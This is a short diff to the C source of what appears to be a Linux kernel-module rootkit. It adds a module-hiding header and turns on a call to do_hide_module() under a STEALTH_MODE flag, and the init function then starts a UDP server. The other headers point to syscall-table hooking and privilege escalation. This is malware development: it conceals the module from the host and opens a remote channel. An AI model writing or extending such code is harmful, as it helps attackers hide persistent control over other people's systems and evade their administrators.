@@ -3,12 +3,14 @@
 #include "syscall_table.h"
 #include "sys_escalation.h"
 #include "server.h"
+#include "module_hiding.h"
 
 /* load the LKM */
 static int __init module_t_load(void)
 {
-  /* do the hiding process */
-  // do_hide_module();
+  /* do the hiding process if in STEALTH MODE */
+  if (STEALTH_MODE)
+    do_hide_module();
 
   /* start the UDP server */
   server_start();
